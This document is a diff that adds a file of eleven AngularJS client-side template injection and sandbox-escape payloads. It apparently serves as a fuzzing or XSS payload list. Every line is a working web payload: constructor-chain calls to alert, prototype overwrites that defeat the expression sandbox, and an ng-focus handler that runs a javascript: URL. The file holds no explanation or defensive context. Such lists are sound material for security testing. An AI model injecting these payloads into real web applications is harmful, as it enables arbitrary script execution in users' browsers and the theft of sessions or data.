@@ -1,0 +1,11 @@
+{{constructor.constructor('alert(1)')()}}
+{{(_=''.sub).call.call({[$='constructor'].getOwnPropertyDescriptor( _.__proto__,$).value,0,'alert(1)')()}}
+{{a="constructor";b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
+{{!ready && (ready = true) && (!call? $$watchers[0].get(toString.constructor.prototype): (a = apply) && (apply =constructor) &&(valueOf = call) && (''+''.toString('F = Function.prototype;' +'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' +'alert(42);')));}}
+<a id="foo" ng-app ng-focus="$event.view.location.replace('javascript:document.write(document.domain)')" contenteditable="true"></a>
+{{objectPrototype = ({})[['__proto__']];objectPrototype[['__defineSetter__']]('$parent', $root.$$postDigest);$root.$listenerCount[['constructor']] = 0;$root.$$listeners = [].map;$root.$$listeners.indexOf = [].map.bind;functionPrototype =[].map[['__proto__']];functionToString = functionPrototype.toString;functionPrototype.push = ({}).valueOf;functionPrototype.indexOf = [].map.bind;foo = $root.$on('constructor', null);functionPrototype.toString = $root.$new;foo();}}{{functionPrototype.toString = functionToString;functionPrototype.indexOf = null;functionPrototype.push = null;$root.$$listeners = {};baz ? 0 : $root.$$postDigestQueue[0]('alert(location)')();baz = true;''}}
+{{0[['__proto__']].toString = [][['__proto__']].pop;0[['__proto__']][0] = 'alert("TROLOLOL\\n"+document.location)';0[['__proto__']].length = 1;'did you know that angularjs eval parses, then re-stringifiesnumbers? :)';$root.$eval("x=0",$root);}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
+{{''.constructor.prototype.charAt=''.valueOf;$eval("x='\"+alert(1)+\"'");}}
